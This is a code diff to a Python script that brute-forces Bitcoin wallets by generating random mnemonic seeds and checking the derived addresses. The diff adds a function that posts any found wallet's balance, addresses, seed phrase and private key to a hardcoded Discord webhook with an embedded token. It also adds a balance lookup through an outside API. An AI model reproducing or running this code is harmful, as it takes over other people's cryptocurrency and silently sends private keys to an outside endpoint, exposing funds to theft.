@@ -20,7 +20,6 @@ from mnemonic import Mnemonic
 from bit import Key
 from bit.format import bytes_to_wif
 
-
 class Color():
     Red = '\33[31m'
     Green = '\33[32m'
@@ -37,6 +36,22 @@ cyan = Color.Cyan
 reset = Color.Reset
 grey = Color.Grey
 
+def message(title, message):
+	embered = { 'title': message }
+	headers = { "Content-Type": "application/json" }
+	data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title), 'embeds': [embered]}
+	webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
+	requests.post(webhook_url, json=data, headers=headers)
+
+def get_balance(address):
+	try:
+		response = requests.get(f"https://bitcoin.atomicwallet.io/api/v2/address/{address}")
+		data = response.json()
+		balance = int(data.get('balance', 0))  / 100000000
+		return balance
+	except Exception as error:
+		print('Error: ', error)
+		return 0
 
 def PrivateKeyFromMnemonic(Magic):
     for i in range(0, 1):
@@ -114,6 +129,8 @@ while True:
                                    f'-------------------------- MMDRZA.COM --------------------------\n')
         print(f"Successfully Saved Match Address In Found.txt Can Checked Now.")
 
+        blc = get_balance(compressAddress)
+        message('NEW BTC WALLET IS FOUND!', f"[{blc} BTC] \n Address: [{compressAddress}][{UncompressAddress}] \n Seed: [{wod}] \n Private: [{PrivateKey}]")
     else:
         lnm = f"{yellow}-{reset}"
         ln = f"{lnm} {green}-{reset}"
@@ -121,6 +138,4 @@ while True:
               f"[{cyan}{z}{reset}] {yellow}Compressed:  {reset}{compressAddress}\n"
               f"[{cyan}{z}{reset}] {yellow}UnCompressed: {reset} {UncompressAddress}\n"
               f"[{cyan}{z}{reset}] {yellow}PrivateKey:  {reset}{green}{PrivateKey}{reset}\n"
-              f"[{cyan}{z}{reset}] {yellow}Mnemonic: {reset}{grey}{wod}{reset}")
-
-
+              f"[{cyan}{z}{reset}] {yellow}Mnemonic: {reset}{grey}{wod}{reset}", end="\r")
